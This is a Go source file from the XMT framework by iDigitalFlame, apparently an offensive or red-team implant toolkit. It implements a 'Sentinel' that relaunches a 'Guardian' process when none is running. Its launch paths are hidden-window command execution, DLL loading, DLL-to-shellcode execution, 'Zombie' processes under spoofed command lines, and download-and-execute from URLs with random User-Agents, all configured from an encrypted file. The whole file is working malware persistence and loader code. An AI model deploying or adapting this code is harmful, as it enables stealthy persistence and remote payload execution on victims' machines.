// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package man

import (
	"context"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"os"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	// Self is a constant that can be used to reference the current executable
	// path without using the 'os.Executable' function.
	Self = "*"

	sentPathExecute  uint8 = 0
	sentPathDLL      uint8 = 1
	sentPathASM      uint8 = 2
	sentPathDownload uint8 = 3
	sentPathZombie   uint8 = 4

	timeout    = time.Second * 5
	timeoutWeb = time.Second * 15
)

// ErrNoEndpoints is an error returned if no valid Guardian paths could be used
// and/or found during a launch.
var ErrNoEndpoints = xerr.Sub("no paths found", 0x11)

// Sentinel is a struct that can be used as a 'Named' arguments value to
// functions in the 'man' package or can be Marshaled from a file or bytes
// source.
type Sentinel struct {
	paths []sentinelPath
	filter.Filter
}
type sentinelPath struct {
	path  string
	extra []string
	t     uint8
}

// Check will attempt to contact any current Guardians watching on the supplied
// name. This function returns false if the specified name could not be reached
// or an error occurred.
//
// This function defaults to the 'Pipe' Linker if a nil Linker is specified.
func Check(l Linker, n string) bool {
	if l == nil {
		l = Pipe
	}
	v, err := l.check(n)
	if bugtrack.Enabled {
		bugtrack.Track("man.Check(): l.(type)=%T n=%s, err=%s, v=%t", l, n, err, v)
	}
	return v
}
func (p *sentinelPath) valid() bool {
	if bugtrack.Enabled {
		bugtrack.Track("man.(*sentinelPath).valid(): p.t=%d, p.path=%s, p.extra=%s", p.t, p.path, p.extra)
	}
	if p.t > sentPathZombie || len(p.path) == 0 {
		return false
	}
	if p.t > sentPathDownload && len(p.extra) == 0 {
		return false
	}
	if p.t != sentPathDownload && p.t != sentPathExecute {
		p.path = device.Expand(p.path)
		if _, err := os.Stat(p.path); err != nil {
			return false
		}
	}
	if !cmd.LoaderEnabled && p.t == sentPathZombie {
		return false
	}
	return true
}

// AddDLL adds a DLL execution type to this Sentinel. This will NOT validate the
// path beforehand.
func (s *Sentinel) AddDLL(p string) {
	s.paths = append(s.paths, sentinelPath{t: sentPathDLL, path: p})
}

// AddASM adds an ASM execution type to this Sentinel. This will NOT validate the
// path beforehand.
//
// This path may be a DLL file and will attempt to use the 'DLLToASM' conversion
// function (if enabled).
func (s *Sentinel) AddASM(p string) {
	s.paths = append(s.paths, sentinelPath{t: sentPathASM, path: p})
}

// AddExecute adds a command execution type to this Sentinel. This will NOT validate
// the command beforehand.
func (s *Sentinel) AddExecute(p string) {
	s.paths = append(s.paths, sentinelPath{t: sentPathExecute, path: p})
}
func (s *Sentinel) read(r io.Reader) error {
	return s.UnmarshalStream(data.NewReader(r))
}
func (s *Sentinel) write(w io.Writer) error {
	return s.MarshalStream(data.NewWriter(w))
}
func (p sentinelPath) run(f *filter.Filter) error {
	if bugtrack.Enabled {
		bugtrack.Track("man.(sentinelPath).run(): Running p.t=%d, p.path=%s", p.t, p.path)
	}
	switch p.t {
	case sentPathDLL:
		if bugtrack.Enabled {
			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a DLL", p.t, p.path)
		}
		x := cmd.NewDLL(p.path)
		x.SetParent(f)
		err := x.Start()
		x.Release()
		return err
	case sentPathASM:
		if bugtrack.Enabled {
			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is ASM", p.t, p.path)
		}
		b, err := data.ReadFile(p.path)
		if err != nil {
			return err
		}
		x := cmd.NewAsm(cmd.DLLToASM("", b))
		x.SetParent(f)
		err = x.Start()
		x.Release()
		return err
	case sentPathZombie:
		if bugtrack.Enabled {
			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Zombie", p.t, p.path)
		}
		b, err := data.ReadFile(p.path)
		if err != nil {
			return err
		}
		var a string
		switch {
		case len(p.extra) > 1:
			a = p.extra[util.FastRandN(len(p.extra))]
		case len(p.extra) == 0:
			return cmd.ErrEmptyCommand
		case len(p.extra) == 1:
			a = p.extra[0]
		}
		x := cmd.NewZombie(cmd.DLLToASM("", b), cmd.Split(a)...)
		x.SetParent(f)
		x.SetNoWindow(true)
		x.SetWindowDisplay(0)
		err = x.Start()
		x.Release()
		return err
	case sentPathExecute:
		var x *cmd.Process
		if p.path == Self {
			if bugtrack.Enabled {
				bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is Self", p.t, p.path)
			}
			e, err := os.Executable()
			if err != nil {
				return err
			}
			x = cmd.NewProcess(e)
		} else {
			if bugtrack.Enabled {
				bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Command", p.t, p.path)
			}
			x = cmd.NewProcess(cmd.Split(p.path)...)
		}
		x.SetParent(f)
		x.SetNoWindow(true)
		x.SetWindowDisplay(0)
		err := x.Start()
		x.Release()
		return err
	case sentPathDownload:
		if bugtrack.Enabled {
			bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is a Download", p.t, p.path)
		}
		var a string
		switch {
		case len(p.extra) > 1:
			a = p.extra[util.FastRandN(len(p.extra))]
		case len(p.extra) == 1:
			a = p.extra[0]
		}
		x, v, err := WebExec(context.Background(), nil, p.path, a)
		if err != nil {
			return err
		}
		x.SetParent(f)
		if err = x.Start(); err != nil && len(v) > 0 {
			os.Remove(v)
		}
		x.Release()
		return err
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.(sentinelPath).run(): p.t=%d, p.path=%s is unknown!", p.t, p.path)
	}
	return cmd.ErrNotStarted
}

// AddZombie adds a command execution type to this Sentinel. This will NOT validate
// the command and filepath beforehand.
//
// The supplied vardic of strings are the spoofed commands to be ran under. The
// first argument of each fake command MUST be a real binary, but the arguments
// can be whatever. AT LEAST ONE MUST BE SUPPLIED FOR THIS TO BE CONSIDERED VALID.
//
// Multiple spoofed commands may be used to generate a randomly picked command
// on each runtime.
//
// This path may be a DLL file and will attempt to use the 'DLLToASM' conversion
// function (if enabled).
func (s *Sentinel) AddZombie(p string, a ...string) {
	s.paths = append(s.paths, sentinelPath{t: sentPathZombie, path: p, extra: a})
}

// MarshalStream will convert the data in this Sentinel into binary that will
// be written into the supplied Writer.
func (s Sentinel) MarshalStream(w data.Writer) error {
	if err := s.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteUint16(uint16(len(s.paths))); err != nil {
		return err
	}
	for i := 0; i < len(s.paths) && i < 0xFFFF; i++ {
		if err := s.paths[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}

// AddDownload adds a download execution type to this Sentinel. This will NOT validate
// the URL beforehand.
//
// The URL will be downloaded on triggering and will be ran based of off the
// 'Content-Type' HTTP header.
//
// The supplied vardic of strings is optional but can be used as a list of HTTP
// User-Agents to be used. The strings support the 'text.Matcher' interface.
//
// Multiple User-Agents may be used to generate a randomly picked User-Agent on
// each runtime.
func (s *Sentinel) AddDownload(p string, a ...string) {
	s.paths = append(s.paths, sentinelPath{t: sentPathDownload, path: p, extra: a})
}

// File will attempt to Marshal the Sentinel struct from the supplied file path.
// This function will take any environment variables into account before loading.
//
// Any errors that occur during reading will be returned.
func File(c cipher.Block, p string) (*Sentinel, error) {
	var s Sentinel
	if err := s.Load(c, device.Expand(p)); err != nil {
		return nil, err
	}
	return &s, nil
}

// UnmarshalStream will attempt to read the data for this Sentinel from the
// supplied Reader.
func (s *Sentinel) UnmarshalStream(r data.Reader) error {
	if err := s.Filter.UnmarshalStream(r); err != nil {
		return err
	}
	n, err := r.Uint16()
	if err != nil {
		return err
	}
	s.paths = make([]sentinelPath, n)
	for i := uint16(0); i < n; i++ {
		if err = s.paths[i].UnmarshalStream(r); err != nil {
			return err
		}
	}
	return nil
}

// Save will attempt to write the Sentinel data to the supplied on-device file
// path. This function will take any environment variables into account before
// writing.
//
// If the supplied cipher is not nil, it will be used to encrypt the data during
// writing, otherwise the data will be un-encrypted.
//
// Any errors that occur during writing will be returned.
func (s *Sentinel) Save(c cipher.Block, p string) error {
	// 0x242 - CREATE | TRUNCATE | RDWR
	f, err := os.OpenFile(device.Expand(p), 0x242, 0644)
	if err != nil {
		return err
	}
	err = s.Write(c, f)
	f.Close()
	return err
}

// Load will attempt to read the Sentinel struct from the supplied file path.
// This function will take any environment variables into account before reading.
//
// If the supplied cipher is not nil, it will be used to decrypt the data during
// reader, otherwise the data will read un-encrypted.
//
// Any errors that occur during reading will be returned.
func (s *Sentinel) Load(c cipher.Block, p string) error {
	// 0x242 - READONLY
	f, err := os.OpenFile(device.Expand(p), 0, 0)
	if err != nil {
		return err
	}
	err = s.Read(c, f)
	f.Close()
	return err
}
func (p sentinelPath) MarshalStream(w data.Writer) error {
	if err := w.WriteUint8(p.t); err != nil {
		return err
	}
	if err := w.WriteString(p.path); err != nil {
		return err
	}
	if p.t < sentPathDownload {
		return nil
	}
	return data.WriteStringList(w, p.extra)
}

// Find will initiate the Sentinel's Guardian launching routine and will seek
// through all it's stored paths to launch a Guardian.
//
// The Linker and name passed to this function are used to determine if the newly
// launched Guardian comes up and responds correctly (within the appropriate time
// constraints).
//
// This function will return true and nil if a Guardian was launched, otherwise
// the boolean will be false and the error will explain the cause.
//
// Errors caused by Sentinel paths will NOT stop the search and the most likely
// error returned will be 'ErrNoEndpoints' which results when no Guardians could
// be loaded.
func (s *Sentinel) Find(l Linker, n string) (bool, error) {
	if bugtrack.Enabled {
		bugtrack.Track("man.(*Sentinel).Find(): Starting with len(s.paths)=%d", len(s.paths))
	}
	if len(s.paths) == 0 {
		return false, ErrNoEndpoints
	}
	var (
		f   = &s.Filter
		err error
	)
	if f.Empty() {
		f = filter.Any
	}
	for i := range s.paths {
		if !s.paths[i].valid() {
			continue
		}
		if bugtrack.Enabled {
			bugtrack.Track("man.(*Sentinel).Find(): n=%s, i=%d, s.paths[i].t=%d", n, i, s.paths[i].t)
		}
		if err = s.paths[i].run(f); err != nil {
			if bugtrack.Enabled {
				bugtrack.Track("man.(*Sentinel).Find(): n=%s, i=%d, s.paths[i].t=%d, err=%s", n, i, s.paths[i].t, err.Error())
			}
			continue
		}
		if bugtrack.Enabled {
			bugtrack.Track("man.(*Sentinel).Find(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
		}
		if time.Sleep(timeout); !Check(l, n) {
			if bugtrack.Enabled {
				bugtrack.Track("man.(*Sentinel).Find(): Wake l.(type)=%T, n=%s failed.", l, n)
			}
			continue
		}
		if bugtrack.Enabled {
			bugtrack.Track("man.(*Sentinel).Find(): Wake l.(type)=%T, n=%s passed!", l, n)
		}
		return true, nil
	}
	if err == nil {
		err = ErrNoEndpoints
	}
	return false, err
}

// Wake will attempt to locate a Gurdian with the supplied Linker and name. If
// no Guardian is found, the 'Find' function will be triggered and will start
// the launching routine.
//
// This function will return true and nil if a Guardian was launched, otherwise
// the boolean will be false and the error will explain the cause. If the error
// is nil, this means that a Guardian was detected.
//
// Errors caused by Sentinel paths will NOT stop the search and the most likely
// error returned will be 'ErrNoEndpoints' which results when no Guardians could
// be loaded.
func (s *Sentinel) Wake(l Linker, n string) (bool, error) {
	if Check(l, n) {
		return false, nil
	}
	return s.Find(l, n)
}

// Read will attempt to read the Sentinel data from the supplied Reader. If the
// supplied cipher is not nil, it will be used to decrypt the data during reader,
// otherwise the data will read un-encrypted.
func (s *Sentinel) Read(c cipher.Block, r io.Reader) error {
	if c == nil || c.BlockSize() == 0 {
		return s.read(r)
	}
	var (
		k      = make([]byte, c.BlockSize())
		n, err = r.Read(k)
	)
	if err != nil {
		return err
	}
	if n != c.BlockSize() {
		return io.ErrUnexpectedEOF
	}
	i, err := crypto.NewBlockReader(c, k, r)
	if err != nil {
		return err
	}
	err = s.read(i)
	i.Close()
	return err
}
func (p *sentinelPath) UnmarshalStream(r data.Reader) error {
	if err := r.ReadUint8(&p.t); err != nil {
		return err
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.(*sentinelPath).UnmarshalStream(): Read one p.t=%d", p.t)
	}
	if err := r.ReadString(&p.path); err != nil {
		return err
	}
	if p.t < sentPathDownload {
		return nil
	}
	return data.ReadStringList(r, &p.extra)
}

// Write will attempt to write the Sentinel data to the supplied Writer. If the
// supplied cipher is not nil, it will be used to encrypt the data during writing,
// otherwise the data will be un-encrypted.
func (s *Sentinel) Write(c cipher.Block, w io.Writer) error {
	if c == nil || c.BlockSize() == 0 {
		return s.write(w)
	}
	var (
		k      = make([]byte, c.BlockSize())
		_, err = rand.Read(k)
	)
	if err != nil {
		return err
	}
	n, err := w.Write(k)
	if err != nil {
		return err
	}
	if n != c.BlockSize() {
		return io.ErrShortWrite
	}
	o, err := crypto.NewBlockWriter(c, k, w)
	if err != nil {
		return err
	}
	err = s.write(o)
	o.Close()
	return err
}

// WakeMultiFile is similar to 'WakeFile' except this function will attempt to load
// multiple Sentinels from the supplied vardic of string paths.
//
// This function will first check for the existence of a Guardian with the supplied
// Linker and name before attempting to load any Sentinels.
//
// Sentinels will be loaded in a random order then the 'Find' function of each
// one will be ran.
//
// If the supplied cipher is not nil, it will be used to decrypt the data during
// reader, otherwise the data will read un-encrypted.
//
// This function will return true and nil if a Guardian was launched, otherwise
// the boolean will be false and the error will explain the cause. If the error
// is nil, this means that a Guardian was detected.
func WakeMultiFile(l Linker, name string, c cipher.Block, paths []string) (bool, error) {
	if len(paths) == 0 {
		return false, ErrNoEndpoints
	}
	if len(paths) == 1 {
		_, r, err := WakeFile(l, name, c, paths[0])
		return r, err
	}
	if Check(l, name) {
		return false, nil
	}
	// NOTE(dij): Instead of running concurrently, do these randomly, but only
	//            pick len() many times. Obviously, we might not cover 100% but
	//            *shrug*.
	//
	//            We can cover duplicates though with 'e'.
	var (
		e   = make([]*Sentinel, len(paths))
		r   bool
		err error
	)
	for i, v := 0, 0; i < len(paths); i++ {
		if v = int(util.FastRandN(len(paths))); e[v] == nil {
			if e[v], err = File(c, paths[v]); err != nil {
				continue
			}
		}
		/*} else {
			// NOTE(dij): Should we run again already loaded entries?
			//            Defaults to yes.
		}*/
		if r, err = e[v].Find(l, name); err != nil {
			if bugtrack.Enabled {
				bugtrack.Track("man.WakeMultiFile(): Find v=%d, returned error err=%s", v, err)
			}
			continue
		}
		if r {
			return true, nil
		}
	}
	return false, nil
}

// WakeFile will attempt to load a Sentinel from the supplied string path if a
// Guardian cannot be detected with the supplied Linker and name.
//
// If no Guardian was found the Sentinel will be loaded and the 'Find' function
// one will be ran.
//
// If the supplied cipher is not nil, it will be used to decrypt the data during
// reader, otherwise the data will read un-encrypted.
//
// This function will return true and nil if a Guardian was launched, otherwise
// the boolean will be false and the error will explain the cause. If the error
// is nil, this means that a Guardian was detected.
func WakeFile(l Linker, name string, c cipher.Block, path string) (*Sentinel, bool, error) {
	if Check(l, name) {
		return nil, false, nil
	}
	s, err := File(c, path)
	if err != nil {
		return nil, false, err
	}
	r, err := s.Wake(l, name)
	return s, r, err
}
